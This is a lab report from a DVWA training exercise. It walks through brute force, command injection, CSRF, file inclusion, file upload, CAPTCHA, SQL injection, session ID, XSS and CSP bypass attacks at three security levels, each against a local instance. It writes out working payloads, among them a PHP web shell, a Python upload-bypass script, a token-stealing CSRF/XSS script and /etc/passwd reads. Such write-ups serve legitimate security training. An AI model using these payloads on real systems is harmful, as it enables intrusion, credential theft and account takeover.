# Application-Security-Testing-DVWA

# DVWA Security Lab Report

Vulnerability Testing
## 1. Brute Force

### Security Level: Low

Payload Used: Burp Suite Intruder Attack

Result: Multiple attempts were made to log in based on the password list I had provided, a few lengths were different indicating they were correct password matches.

Screenshot:
<img width="1818" height="857" alt="Attack Result" src="https://github.com/user-attachments/assets/6a43b826-facc-42ce-bd2c-cb0cb6f72cb8" />


Explanation of why it worked: There is no limit to the number of log in attempts I can make, hence I can simply brute force every common password possible. Especially since the passwords are not complicated.

### Security Level: Medium

Payload Used: Burp Suite Intruder Attack

Result: Multiple attempts were made to log in again based on the same password list, once more the correct password was found.

Screenshot:
<img width="1810" height="811" alt="Brute Med" src="https://github.com/user-attachments/assets/81aec2a7-f268-42be-9822-6ad1a4f70fb9" />


Explanation of why it worked: Because the medium security only has a 2 second gap between attempts, brute force is still possible as there is only a minor delay between password attempts.

### Security Level: High

Payload Used: Burp Suite Intruder Attack

Result: Multiple attempts were made to log in, this time with a token being generated and Recursive GERP being utilised. Once more, the correct password and token combination was found.

Screenshot:
<img width="1803" height="752" alt="Brute High" src="https://github.com/user-attachments/assets/80df1b5d-3f4e-4dfa-a29f-6393c317cc4a" />


Explanation of why it failed/worked: There is a CSRF token being used on this level, where on every page refresh a new token is generated. In order to do this, I had to not only brute force the passwords but extract the token for each refresh as well. Successfully doing this allowed me to figure out the password.

Security Level Comparison
At Low security, there were no protection measures so it was a trivial case of trying multiple passwords. At medium difficulty there was only a short delay but it was still easy. At high difficulty it was more complicated where I had to extract the token as well to find out the password.

## 2. Command Injection

### Security Level: Low

Payload Used: Browser itself, 127.0.0.1; cat /etc/passwd

Result: Entire list of user accounts on linux server dumped on screen.

Screenshot:
<img width="825" height="672" alt="Command Injection Low" src="https://github.com/user-attachments/assets/b7f25029-1f2d-46d7-b04f-0374db2b0d23" />



Explanation of why it worked: On the lowest level the system executes whatever command is inputted directly into power shell. Because there is no sanitation, a person can use operators like semi colons to execute any commands they want directly.

### Security Level: Medium

Payload Used: Browser itself, 127.0.0.1 | cat /etc/password

Result: Entire list of user accounts on linux server dumped on screen.

Screenshot:
<img width="827" height="527" alt="Command Injection Medium" src="https://github.com/user-attachments/assets/0d2f9f11-7127-4090-b989-69c201d788ad" />




Explanation of why it worked: On the medium level, the developer has put blacklists of operators like semi colon but the issue is he overlooked others such as | so they can still be exploited.

Explanation of why the Low level payload failed: The Low level payload utilized a simple semicolon (;) to chain commands. The Medium security level introduces a server-side blacklist that specifically searches for and removes the && and ; characters, rendering the exact Low level payload inert.

### Security Level: High

Payload Used: Browser itself, 127.0.0.1|cat /etc/password

Result: Entire list of user accounts on linux server dumped on screen.

Screenshot:
<img width="822" height="512" alt="Command Injection High" src="https://github.com/user-attachments/assets/3a3e72f6-3153-4822-8544-82d8f1a434d7" />





Explanation of why it worked: The developer has done a great job making a proper blacklist, but he made a typo in the blacklist where he added a trailing space. Meaning if I just change the commands spaces to exploit this, I easily got past it.

Explanation of why the Medium level payload failed: The Medium payload used the pipe operator (|). The High level expands the blacklist to include |, effectively blocking standard pipe injections from executing subsequent commands.

## 3. CSRF

### Security Level: Low

Payload Used: External HTML link. http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change

Result: Password for the website was changed successfully upon clicking the link given in the html.

Screenshot:
<img width="1918" height="913" alt="CSRF low level" src="https://github.com/user-attachments/assets/5f73240e-b0d0-472e-8f04-1f2ee78dc777" />





Explanation of why it worked: I created an external html which when you open, it takes advantage of the fact that the low level security threat uses a simple HTTP GET request, all new paramters are being passed directly into the URL. Hence inside this external html, once they click on the link, it loads a change password cross attack which overrides the websites password.

### Security Level: Medium

Payload Used: External HTML link. Referer: http://127.0.0.1.hacker.com/evil.html

Result: Password for the website was changed successfully after the new url was used.

Screenshot:
<img width="1471" height="377" alt="CSRF Medium level" src="https://github.com/user-attachments/assets/0415dc62-c4ed-48fb-bcb7-c80958a6386b" />






Explanation of why it worked: The security check is broken, the developer isn't checking if the referer being used for the URL exactly matches, they are simply checking if 127.0.0.1 is anywhere in the line. Hence as long as the URL for the evil.html file contains 127.0.0.1 anywhere, it still goes through and the same exploit for changing password works.

Explanation of why the Low level payload failed: The Low payload relied on blindly executing a URL from an external source. The Medium level introduces a check on the HTTP Referer header, ensuring the request appears to originate from the DVWA server itself rather than a third-party webpage.

### Security Level: High

Payload Used: Chained attack, uses inbuilt XSS Stored module to bypass CSRF protection
```html
  <script>
  var req = new XMLHttpRequest();
  req.onload = function() {
      var token = this.responseText.match(/user_token\' value=\'(.*?)\'/)[1];
      var attack = new XMLHttpRequest();
      attack.open("GET", "[http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token=](http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token=)" + token, true);
      attack.send();
  };
  req.open("GET", "[http://127.0.0.1:8080/vulnerabilities/csrf/](http://127.0.0.1:8080/vulnerabilities/csrf/)", false);
  req.send();
  </script>
```

Result: Password for the website was changed successfully.

Screenshot:
<img width="1195" height="906" alt="CSRF High level" src="https://github.com/user-attachments/assets/a384cb21-64c1-403e-9cf4-146ae844017f" />





Explanation of why it worked: There is an anti-CRF token (user token) that is being validated on the server, which external attacks like we used cannot read. But now we bypass this because we used stored XSS vulnerability on the same trusted origin. Because we run this javascript directly in the application, the code is executing within the trusted origin, bypassing the SOP thus executing the request.

Explanation of why the Medium level payload failed: The Medium payload bypassed the Referer check by spoofing the URL string. The High level negates this by requiring a dynamically generated, anti-CSRF token (user_token) that changes on every request, making static URLs and Referer spoofing useless.

## 4. File Inclusion

### Security Level: Low

Payload Used: ?page=../../../../../../etc/passwd

Result: The website outputted the entire linux user depository on the top of the screen.

Screenshot:
<img width="1901" height="908" alt="File Inclusion Low" src="https://github.com/user-attachments/assets/b31de28c-e58c-4390-a12b-eb22da0c99f9" />






Explanation of why it worked: At this security level, the website is simply taking whatever page is inputted into the URL and passes it directly into the code. Using a trick known as path traversal, we can then execute any command in the terminal and exploit this vulnerability.

### Security Level: Medium

Payload Used: ?page=....//....//....//....//....//....//etc/passwd

Result: The website outputted the entire linux user depository on the top of the screen.

Screenshot:
<img width="1898" height="911" alt="File Inclusion Medium" src="https://github.com/user-attachments/assets/4f5006df-204b-4ff0-800d-28f32d4d42f9" />







Explanation of why it worked: At this security level, the security level is checking for strings such as "../" however there is a fatal flaw, that it only checks once. Meaning if I simply embed and repeat the ../ twice it will not be filtered and the command will still work as intended.

Explanation of why the Low level payload failed: The Low payload used standard ../ directory traversal strings. The Medium level implements a filter that explicitly searches for and deletes the exact ../ and ..\ character sequences.

### Security Level: High

Payload Used: ?page=file:///etc/passwd

Result: The website outputted the entire linux user depository on the top of the screen.

Screenshot:
<img width="1886" height="962" alt="File Inclusion High" src="https://github.com/user-attachments/assets/746a8d33-62a8-407c-ae69-66ac5646186d" />








Explanation of why it worked: At this security level, the security level is moving away from a blacklist to a white list where it's only allowing certain strings. However there is a loophole as PHP has built-in protocols, one being the file:// protocol, which goes right through the whitelist and in turn still fetches the path etc/passwd and dumps the information.

Explanation of why the Medium level payload failed: The Medium payload nested the traversal strings (....//) to bypass the simple deletion filter. The High level abandons the blacklist approach entirely and uses a strict whitelist, requiring the input to start with either file or include.php.

## 5. File Upload

### Security Level: Low

Payload Used: File uploaded containing the command <?php system($_GET['cmd']); ?>

Result: The URL can now be used to execute commands such as ls and achieve full remote code execution.

Screenshot:
<img width="1913" height="963" alt="File Upload Low" src="https://github.com/user-attachments/assets/894063e5-3837-46fa-8c83-5892130fbaeb" />







Explanation of why it worked: In this security level, the website simply allows for any file to be uploaded without checking for file extensions. As a result, because the web server is designed to execute php files, we can simply run php code directly on the server.

### Security Level: Medium

Payload Used: File uploaded containing a script:
```import requests

# 1. The target URL in your local Docker container
url = "http://127.0.0.1:8080/vulnerabilities/upload/"

# 2. Your active browser session
cookies = {
    "PHPSESSID": "aomhsi8s8787jjtg2ov753itu4", 
    "security": "medium"
}

# 3. The Web Shell Payload
shell_code = "<?php system($_GET['cmd']); ?>"

# 4. The Bypass: Forging the Request
# We tell Python to upload a file named 'shell.php', containing our code,
# but we explicitly tell the server the MIME type is 'image/jpeg'.
files = {
    'uploaded': ('shell.php', shell_code, 'image/jpeg')
}

# The form also requires the Upload button to be "clicked"
data = {
    'Upload': 'Upload'
}

# 5. Fire the Request
print("[*] Sending spoofed HTTP request...")
response = requests.post(url, files=files, data=data, cookies=cookies)

# 6. Check the Results
if "successfully uploaded" in response.text:
    print("[+] Bypass Successful!")
    print("[+] The server accepted the .php file because the header said it was an image.")
    print("[+] Execute commands here: http://127.0.0.1:8080/hackable/uploads/shell.php?cmd=whoami")
else:
    print("[-] Upload failed. Double-check your PHPSESSID cookie and ensure DVWA is set to Medium.")
```

Result: Successfully bypassed the file type filter, uploaded the PHP web shell, and achieved Remote Code Execution.

Screenshot:
<img width="1918" height="962" alt="File Upload Medium" src="https://github.com/user-attachments/assets/2ce5282e-5d1c-4140-b8db-0dc2e63f9acf" />








Explanation of why it worked: The Medium security level attempts to restrict uploads by verifying the Content-Type header provided by the client (e.g., ensuring it is image/jpeg or image/png). However, it relies entirely on user-controllable input without validating the actual file contents or extension on the server side. By writing a Python script to construct the HTTP POST request, the Content-Type header can be manually spoofed to an accepted MIME type, tricking the application into storing the executable PHP script.

Explanation of why the Low level payload failed: The Low payload successfully uploaded a raw .php file. The Medium level checks the HTTP Content-Type header and rejects any file that doesn't report itself as a valid image format (e.g., image/jpeg).


### Security Level: High

Payload Used: A polyglot payload disguising PHP code inside an image file structure: GIF89a; <?php system($_GET['cmd']); ?>, saved as hacked.jpg. 

Result: Successfully bypassed strict file extension and content-signature validation to upload a malicious payload, and achieved Remote Code Execution by utilizing the LFI vulnerability to execute the injected code.

Screenshot:
<img width="1900" height="962" alt="File Upload High" src="https://github.com/user-attachments/assets/358e4f2a-642e-4ecc-afe9-80df8e460433" />
<img width="1897" height="697" alt="File Upload High 2" src="https://github.com/user-attachments/assets/e2d987e2-c97c-4d21-9cc7-e50f4007bcbd" />









Explanation of why it worked: The validation was bypassed by forging a file header. The string GIF89a; acts as a valid magic byte signature for a GIF, satisfying the getimagesize() check, while the .jpg extension bypasses the name filter. Because the web server will not natively execute a .jpg file as PHP, the attack requires chaining with a Local File Inclusion vulnerability. The include()  function in PHP evaluates any PHP tags present within the included file, regardless of its extension, allowing the embedded web shell to execute and process arbitrary operating system commands.

Explanation of why the Medium level payload failed: The Medium payload spoofed the Content-Type header while retaining a .php extension. The High level strictly requires an image file extension (like .jpg) and uses getimagesize() to cryptographically verify the file actually has a valid image signature (magic bytes).

## 6. Insecure CAPTCHA

### Security Level: Low

Payload Used: Simply edited the HTML of the page to change `<input type="hidden" name="step" value="2">` value from 1 to 2.

Result: The website genuinely believed the page form was now on step 2, and the password was changed bypassing the CAPTCHA.

Screenshot:
<img width="1597" height="902" alt="Captcha Low" src="https://github.com/user-attachments/assets/b1ccfc1b-a88f-4a38-bf4a-e6389b832d6c" />


Explanation of why it worked: At the Low security level, the application utilizes a multi-step workflow for the password change process, relying on a client-provided step parameter to track progression. Because the server blindly trusts client-side input, an attacker can use browser developer tools to manually alter the DOM before submission, changing the step parameter to 2. This causes the server-side script to bypass the entire CAPTCHA validation code block and immediately execute the database update.

### Security Level: Medium

Payload Used: Simply edited the HTML of the page to change `<input type="hidden" name="step" value="2">` value from 1 to 2. And inserted new line below it with `<input type="hidden" name="passed_captcha" value="true">`

Result: The website genuinely changed the password believing the captcha was verified.

Screenshot:
<img width="1777" height="967" alt="Insecure Captcha Medium" src="https://github.com/user-attachments/assets/6ad4f88d-933e-4a68-8d98-2049b79f2e14" />

Explanation of why it worked:The Medium security level attempts to patch the Low vulnerability by introducing a second parameter passed_captcha. The server verifies that both step=2 and passed_captcha=true are present in the POST request. However, the core logic flaw remains: the server relies entirely on client-side input for authorization. By utilizing browser developer tools to inject the passed_captcha parameter into the DOM alongside the modified step parameter, an attacker can trivially forge the necessary verification flags and bypass the CAPTCHA requirement completely.

Explanation of why the Low level payload failed: The Low payload simply manipulated the step=2 variable. The Medium level adds a secondary verification check, requiring a new boolean parameter called passed_captcha=true to exist in the submission.

### Security Level: High

Payload Used: Utilized browser Developer Tools (Network Conditions) to override the User-Agent header to reCAPTCHA, and manipulated the DOM to inject the hidden parameter `<input type="hidden" name="g-recaptcha-response" value="hidd3n_valu3">`.

Result: The website genuinely changed the password believing the captcha was verified.

Screenshot:
<img width="1760" height="952" alt="Insecure Captcha High" src="https://github.com/user-attachments/assets/8a917bf4-9f8b-4a0d-b065-94e6c20f9de5" />












Explanation of why it worked: The PHP source code contains a fallback condition that grants authorization if the g-recaptcha-response parameter exactly matches hidd3n_valu3 and the HTTP User-Agent header matches reCAPTCHA. By using browser developer tools to manually spoof the header and inject the required form data, an attacker can trivially bypass the intended CAPTCHA enforcement without needing an external proxy.

Explanation of why the Medium level payload failed: The Medium payload manually injected the missing boolean parameter. The High level shifts the verification logic, requiring a specific User-Agent header and an exact expected string from the Google reCAPTCHA API (g-recaptcha-response).

## 7. SQL Injection

### Security Level: Low

Payload Used: `' OR 1=1 #` entered into the User ID input field.

Result: Successfully manipulated the backend SQL query to evaluate as globally true, causing the application to dump the entire users database table to the screen.

Screenshot:
<img width="1321" height="902" alt="SQL Injection Low" src="https://github.com/user-attachments/assets/a3655260-2d5c-40ca-abe0-7c6e062b09bd" />



Explanation of why it worked: At the Low security level, user input is concatenated directly into the SQL query string without any sanitization or parameterized queries. By injecting a single quote ', the attacker escapes the intended data context. Adding `OR 1=1` creates a tautology (a condition that is always true), forcing the `WHERE` clause to return every record in the table. The hash symbol (`#`) comments out the remainder of the legitimate query, preventing syntax errors.

### Security Level: Medium

Payload Used: `' OR 1=1 #` entered into the inspect tool dropdown code.

Result: Successfully manipulated the backend SQL query to evaluate as globally true, causing the application to dump the entire users database table to the screen.

Screenshot:
<img width="1127" height="900" alt="SQL Injection Medium" src="https://github.com/user-attachments/assets/ede8f47e-5bfa-4c5e-bb28-aed9096849f7" />




Explanation of why it worked: The developer believed that by making a drop down menu, it gets rid of any risk of an individual entering malicious code. But they made the error of removing quotation marks around id, meaning I can simply go into developer tools and add the same or condition into any dropdown condition and it will execute it regardless.

Explanation of why the Low level payload failed: The Low payload was typed directly into a text box and used quotation marks (') to escape the query context. The Medium level removes the text box in favor of a dropdown menu to restrict input, and runs the input through mysqli_real_escape_string() to neutralize quotation marks.

### Security Level: High

Payload Used: `' OR 1=1 #` entered into the input box.

Result: Successfully manipulated the backend SQL query to evaluate as globally true, causing the application to dump the entire users database table to the screen.

Screenshot:
<img width="1252" height="878" alt="SQL Injection High" src="https://github.com/user-attachments/assets/a795aebb-d5da-442a-bf6b-2ba701ca479b" />




Explanation of why it worked: The developer believed that by making a separate window for input and putting a LIMIT 1, any automated script would break. The issue is as a human we can easily circumvent this, because the query itself is unchanged frmo how it is at low level, we merely just need to once again inject the `' OR 1=1 #` where the # gets rid of the LIMIT 1 and the query is run and outputs information to us.

Explanation of why the Medium level payload failed: The Medium payload intercepted the dropdown via proxy/DOM. The High level attempts to disrupt automated tools by moving the input vector to a completely separate session window and appending a strict LIMIT 1 to the query output.

## 8. SQL Injection (Blind)

### Security Level: Low

Payload Used: True condition: `1' AND 1=1 #`

Result: Successfully identified a Boolean-based Blind SQL Injection vulnerability. By injecting AND conditions, the application's generic responses ("User ID exists" vs. "User ID is MISSING") could be used to infer the true/false state of arbitrary database queries.

Screenshot:
<img width="855" height="572" alt="SQL Injection Blind" src="https://github.com/user-attachments/assets/d2e7c032-f802-4e7a-a144-38af00385d28" />




Explanation of why it worked: At the Low security level, the application is vulnerable to classic SQL injection due to unsanitized input WHERE user_id = '$id', but it does not reflect database contents or errors to the screen. Instead, it relies on boolean inference. By injecting an AND operator, an attacker can append true or false logical statements to a valid user ID query. The application's varying responses based on the evaluated truth of the injected statement confirm the vulnerability and provide a mechanism for data extraction via automated character guessing.

### Security Level: Medium

Payload Used: 
True condition: `1 AND 1=1` (Injected via DOM manipulation)
False condition: `1 AND 1=2` (Injected via DOM manipulation)

Result: Successfully bypassed the dropdown menu restriction and the `mysqli_real_escape_string()` filter to prove Boolean-based Blind SQL Injection.

Screenshot:
<img width="1851" height="911" alt="SQL Injection Blind Medium" src="https://github.com/user-attachments/assets/3e541f76-dd8a-4fbd-84f2-e14bd8826067" />





Explanation of why it worked: The Medium security level attempts to stop injection by utilizing a dropdown menu and escaping input strings. However, because the backend query treats the input as an integer `WHERE user_id = $id`, it does not require enclosing quotes to break the data context. By using browser developer tools to manually modify the value of a dropdown `<option>`, an attacker can inject raw boolean logic (`AND 1=1`) that cleanly bypasses the escaping function and forces the database to evaluate the appended condition.

Explanation of why the Low level payload failed: The Low payload utilized single quotes. Similar to the standard SQLi module, the Medium level restricts input via a dropdown menu and neutralizes quotes using mysqli_real_escape_string().

### Security Level: High

Payload Used: 
True condition: `1 AND 1=1` (Injected via browser cookie)
False condition: `1 AND 1=2` (Injected via browser cookie)

Result: Successfully bypassed the UI restrictions by directly manipulating the `id` session cookie, proving Boolean-based Blind SQL Injection.

Screenshot:
<img width="1917" height="907" alt="SQL Injection Blind High" src="https://github.com/user-attachments/assets/f53d6d04-79a9-4b19-a07f-a1b5414f6e80" />
<img width="1918" height="907" alt="SQL Injection Blind High 2" src="https://github.com/user-attachments/assets/982a5cb8-a8ca-45ff-8f73-a27cc0e79427" />






Explanation of why it worked: The backend PHP code still dynamically concatenates the cookie value into the SQL query `WHERE user_id = '$id' LIMIT 1` without proper logic sanitization. By using browser developer tools to manually overwrite the `id` cookie with classic logic payloads (`1' AND 1=1 #`), an attacker can force the backend database to evaluate the appended boolean conditions, inferring the results upon page refresh.

Explanation of why the Medium level payload failed: The Medium payload relied on DOM manipulation of the POST request. The High level completely removes the injection vector from the GET/POST parameters and instead tracks the target id strictly through a background browser cookie.

## 9. Weak Session IDs

### Security Level: Low

Payload Used: Observation of the `dvwaSession` cookie behavior via browser Developer Tools.

Result: Demonstrated that the application generates entirely predictable, sequentially incrementing session IDs.

Screenshot:
<img width="1917" height="967" alt="Weak Session IDs low" src="https://github.com/user-attachments/assets/d0c34688-7bb5-414a-ad51-55b835118f47" />





Explanation of why it worked: At the Low security level, the application fails to use a cryptographically secure pseudorandom number generator (CSPRNG) for session identifiers. Instead, it relies on a simple global counter that increments by 1 for every new request. This predictability allows an attacker to trivially guess the active session IDs of other authenticated users, enabling session hijacking and unauthorized account takeover.

### Security Level: Medium

Payload Used: Observation of the `dvwaSession` cookie behavior via browser Developer Tools.

Result: Demonstrated that the application generates session IDs based on the current Unix epoch timestamp.

Screenshot:
<img width="1848" height="907" alt="Weak Session IDs medium" src="https://github.com/user-attachments/assets/9a8fbdde-ae50-4da7-8ba9-18835e711b94" />






Explanation of why it worked: The Medium security level attempts to improve upon the simple sequential counter by using the PHP `time()` function to generate the session ID. While the resulting 10-digit number appears more complex, it is not cryptographically random. Unix time is completely predictable. An attacker who knows approximately when a victim authenticated can easily brute-force the session ID by generating and testing the timestamps for that specific time window, leading to session hijacking.

Explanation of why the Low level payload failed: The Low level used a basic sequential counter (1, 2, 3), making the next ID instantly predictable. The Medium level calculates the ID based on the exact Unix timestamp, requiring the attacker to know the specific second the user logged in.

### Security Level: High

Payload Used: Extracted the `dvwaSession` cookie via Developer Tools and reverse-engineered the value using an MD5 hash cracking tool (e.g., CrackStation).

Result: Successfully demonstrated that the seemingly random 32-character session identifiers are merely MD5 hashes of a predictable, sequential counter.

Screenshot:
<img width="1838" height="911" alt="Weak Session IDs high" src="https://github.com/user-attachments/assets/a323796f-724e-4ea2-ba6b-fca0d31d30a4" />







Explanation of why it worked: Because the keyspace (small integers) is incredibly limited, the hashes are highly vulnerable to dictionary attacks or rainbow table lookups. By extracting the hashed cookie and running it through a standard hash reversal tool, an attacker can easily uncover the underlying sequential pattern, predict future session IDs, and achieve session hijacking.

Explanation of why the Medium level payload failed: The Medium level IDs were plainly readable timestamps. The High level obfuscates this by passing an incrementing counter through an MD5 hashing algorithm, hiding the sequential nature of the generation.

## 10. XSS (DOM)

### Security Level: Low

Payload Used: `<script>alert("Hacked!")</script>` injected directly into the `default` URL parameter.

Result: Successfully executed arbitrary JavaScript within the victim's browser context (DOM) via a manipulated URL.


Screenshot:
<img width="1897" height="912" alt="XSS Dom Low" src="https://github.com/user-attachments/assets/6c7a423b-4314-452e-9245-55d12b14e149" />


Explanation of why it worked: At the Low security level, the application's client-side JavaScript extracts the value of the `default` parameter from the URL and passes it directly into a hazardous execution sink (`document.write`) to construct the language dropdown menu. Because the input is not sanitized or encoded before being rendered into the Document Object Model, the browser interprets the injected `<script>` tags as executable code rather than plain text.

### Security Level: Medium

Payload Used: `</select><img src=x onerror=alert("Hacked!")>` injected into the `default` URL parameter.

Result: Successfully bypassed the server-side `<script>` tag filter and executed arbitrary JavaScript within the victim's browser context.

Screenshot:
<img width="1902" height="967" alt="XSS Dom Medium" src="https://github.com/user-attachments/assets/e905f88e-4b12-4410-bfca-b45f5a63688a" />




Explanation of why it worked: The Medium security level attempts to mitigate XSS by implementing a server-side blacklist that searches for and blocks the literal string `<script`. This is an insecure design pattern because it fails to account for alternative HTML execution contexts. By utilizing an `<img>` tag with an `onerror` event handler, an attacker can execute JavaScript without ever using a `<script>` tag. Prepending `</select>` to the payload forces the browser to break out of the intended dropdown menu element, allowing the subsequent image tag to be rendered and the malicious event handler to fire.

Explanation of why the Low level payload failed: The Low payload used a standard <script> tag. The Medium level utilizes a server-side stripos() function to strictly blacklist and remove the literal string <script.

### Security Level: High

Payload Used: `English#</select><script>alert("Hacked!")</script>` injected into the `default` URL parameter.

Result: Successfully bypassed the strict server-side whitelist by utilizing the URL fragment identifier (`#`), resulting in arbitrary JavaScript execution in the DOM.

Screenshot:
<img width="1912" height="960" alt="XSS Dom High" src="https://github.com/user-attachments/assets/a79069d3-5999-46c5-8c0f-8182ce504fa4" />

Explanation of why it worked: The vulnerability resides purely in the client-side Document Object Model (DOM). By placing the malicious payload after a URL fragment identifier (`#`), the payload is never transmitted to the backend server, completely bypassing the PHP whitelist. The client-side JavaScript (`document.location.href`), however, processes the entire URL string including the fragment. It extracts the hidden payload and insecurely writes it into the DOM, allowing the attacker to break out of the `<select>` HTML context and execute arbitrary code.

Explanation of why the Medium level payload failed: The Medium payload broke out of the <select> tag and used an <img> event handler. The High level introduces a strict server-side whitelist, rejecting any URL parameter that isn't an exact match for one of the pre-approved languages (e.g., English, French).

## 11. XSS (Reflected)

### Security Level: Low

Payload Used: `<script>alert("Hacked!")</script>` entered into the "name" input field.

Result: Successfully executed arbitrary JavaScript within the browser. The server reflected the unsanitized input directly into the page's HTML structure.


Screenshot:
<img width="1917" height="957" alt="XSS Reflected Low" src="https://github.com/user-attachments/assets/36a006da-f94a-4b7a-8543-78116753bf86" />



Explanation of why it worked: At the Low security level, the application takes the user-supplied `name` parameter via a GET request and echoes it directly onto the page without any validation, filtering, or output encoding. Because the browser cannot distinguish between the developer's intended HTML and the attacker's injected script, it simply executes the reflected `<script>` tags as code.

### Security Level: Medium

Payload Used: `<Script>alert("Hacked!")</script>` entered into the "name" input field.

Result: Successfully bypassed the server's blacklist filter by utilizing mixed-case HTML tags, resulting in arbitrary JavaScript execution within the browser.
* **Screenshot:**

Screenshot:
<img width="1916" height="966" alt="XSS Reflected Medium" src="https://github.com/user-attachments/assets/095e977b-461e-4051-b352-1118a7928521" />



Explanation of why it worked: The Medium security level attempts to stop XSS by passing the user input through PHP's `str_replace()` function to strip out `<script>` tags. However, `str_replace()` is case-sensitive. The developer failed to use a case-insensitive function (like `str_ireplace()`) or implement proper HTML entity encoding. By manipulating the capitalization of the injected tags (e.g., `<Script>`), an attacker can evade the exact-match filter while still providing a payload that the victim's browser will recognize and execute as valid HTML/JavaScript.

Explanation of why the Low level payload failed: The Low payload utilized the exact lowercase tag <script>. The Medium level uses the str_replace() function to find and delete that exact lowercase string.

### Security Level: High

Payload Used: `<svg onload=alert("Hacked!")>` entered into the "name" input field.

Result: Successfully bypassed the server's regular expression (Regex) filter by utilizing an alternative HTML tag and event handler, resulting in arbitrary JavaScript execution within the browser.), resulting in arbitrary JavaScript execution in the DOM.

Screenshot:
<img width="1916" height="962" alt="XSS Reflected High" src="https://github.com/user-attachments/assets/18b3520c-4172-41b5-8da1-c4d085943157" />

Explanation of why it worked: Because the developer only blacklisted the specific "script" string pattern, the application remains vulnerable to alternative XSS vectors. By injecting an `<svg>` tag with an `onload` event handler, an attacker can provide a payload that completely evades the Regex pattern while still forcing the victim's browser to execute the embedded JavaScript upon rendering the reflected HTML.

Explanation of why the Medium level payload failed: The Medium payload bypassed the filter by using mixed-case letters (<Script>). The High level upgrades the defense to preg_replace() with a case-insensitive regular expression, wiping out any variation of the word "script".

## 12. XSS (Stored)

### Security Level: Low

Payload Used: `<script>alert("Stored XSS Hacked!")</script>` entered into the "Message" input field.

Result: Successfully injected and stored arbitrary JavaScript permanently into the application's database. The script executes automatically for any user who views the guestbook page.

Screenshot:
<img width="1918" height="966" alt="XSS Stored Low" src="https://github.com/user-attachments/assets/f5fe1cfd-64fe-4b6c-87b5-88faaa50ffe5" />




Explanation of why it worked: At the Low security level, the application takes user input from the guestbook form and stores it directly into the backend database without any sanitization. When the application retrieves these entries to display them on the page, it fails to HTML-encode the output. As a result, the victim's browser interprets the stored `<script>` tags as executable code rather than plain text, resulting in a persistent XSS vulnerability.

### Security Level: Medium

Payload Used: `<Script>alert("Medium Stored XSS!")</script>` entered into the "Name" input field (after bypassing client-side length restrictions).

Result: Successfully bypassed both the client-side character limit and the server-side case-sensitive blacklist, resulting in persistent JavaScript execution.

Screenshot:
<img width="1918" height="966" alt="XSS Stored Medium" src="https://github.com/user-attachments/assets/81c889c8-5347-49bc-afcd-4b3d137f9ca1" />





Explanation of why it worked: The Medium security level attempts to secure the application by aggressively sanitizing the "Message" parameter and applying a case-sensitive `<script>` filter to the "Name" parameter. Furthermore, it implements a client-side HTML restriction (`maxlength="10"`) on the Name input to prevent long payloads.

Explanation of why the Low level payload failed: The Low payload injected a script directly into the large "Message" box. The Medium level applies strict strip_tags() sanitization to the message box and implements a client-side maxlength="10" restriction on the unprotected "Name" box.

### Security Level: High

Payload Used: `<svg onload=alert("High Stored XSS!")>` entered into the "Name" input field (after bypassing client-side length restrictions).

Result: Successfully bypassed both the client-side character limit and the server-side regular expression (Regex) blacklist, resulting in persistent JavaScript execution.

Screenshot:
<img width="1902" height="962" alt="XSS Stored High" src="https://github.com/user-attachments/assets/ab168d9f-bddc-4e30-9be5-09d690e5a51f" />






Explanation of why it worked: Client-side input length restrictions can be trivially removed by modifying the Document Object Model (DOM) using browser developer tools. Once the length restriction is removed, the backend Regex filter can be bypassed by utilizing a blacklist evasion technique. By injecting an alternative HTML tag that does not contain the word "script" (such as an `<svg>` tag with an `onload` event handler), the payload passes through the filter untouched and is permanently stored in the database, allowing for persistent cross-site scripting.

Explanation of why the Medium level payload failed: The Medium payload bypassed the length limit and used a mixed-case <Script> tag. The High level implements the case-insensitive Regex filter on the "Name" box to catch all spelling variations of the tag.

## 13. CSP Bypass

### Security Level: Low

Payload Used: Chained Exploit (Unrestricted File Upload + CSP Bypass).
1. Uploaded `hacked.js` (containing `alert("CSP Bypass Chained!");`) via the File Upload vulnerability.
2. Injected the relative server path `../../hackable/uploads/hacked.js` into the CSP Bypass input field.

Result: Successfully bypassed the Content Security Policy by leveraging the `'self'` whitelist directive, resulting in arbitrary JavaScript execution within the browser.

Screenshot:
<img width="1918" height="893" alt="CSP Bypass Low" src="https://github.com/user-attachments/assets/3bd84270-31eb-42bf-a6c5-20eb4778c299" />





Explanation of why it worked: At the Low security level, the application's CSP includes the `'self'` directive (`script-src 'self' https://pastebin.com`), which implicitly trusts and executes any script hosted on the same origin server. By chaining a separate file upload vulnerability to drop a malicious JavaScript file directly onto the DVWA server, an attacker can bypass external domain restrictions entirely. When the local file path is passed to the CSP Bypass module, the browser sees the script originating from `'self'` and executes the payload without restriction.

### Security Level: Medium

Payload Used: `<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert("Medium CSP Bypassed!")</script>`

Result: Successfully bypassed the Content Security Policy by forging an authorized script execution token.

Screenshot:
<img width="1918" height="967" alt="Medium CSP" src="https://github.com/user-attachments/assets/78e4e23c-577a-4053-9155-7e79441a37ce" />






Explanation of why it worked: The Medium security level attempts to secure inline scripts by implementing a CSP nonce (`script-src 'self' 'nonce-...'`). A nonce (Number Used Once) is intended to be a cryptographically secure, randomly generated token that changes on every single HTTP response. However, the developer hardcoded a static nonce value (`TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=`). Because the nonce never changes, an attacker can trivially read the value from the page source or response headers and include it as an attribute in their injected `<script>` tag, effectively neutralizing the CSP protection.

Explanation of why the Low level payload failed: The Low payload leveraged an external Pastebin link that was insecurely whitelisted. The Medium level completely removes the external domain whitelist and requires inline scripts to contain a specific, verified nonce attribute.

### Security Level: High

Payload Used: Injected via the browser console:
  `var s = document.createElement("script"); s.src = "source/jsonp.php?callback=alert('High CSP Bypassed!');//"; document.body.appendChild(s);`

Result: Successfully bypassed the strict `'self'` Content Security Policy by leveraging an insecure JSONP endpoint on the same origin.

Screenshot:
<img width="1918" height="903" alt="CSP high" src="https://github.com/user-attachments/assets/27c76061-d07a-42aa-b8a2-ab286b2f35dc" />







